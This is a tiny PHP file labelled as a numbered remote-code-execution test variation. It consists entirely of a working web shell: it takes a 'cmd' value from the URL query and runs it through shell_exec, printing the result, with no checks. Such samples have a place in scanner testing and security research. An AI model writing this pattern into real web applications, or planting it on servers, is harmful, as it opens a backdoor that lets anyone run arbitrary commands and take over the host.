<?php
// RCE test variation #983
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>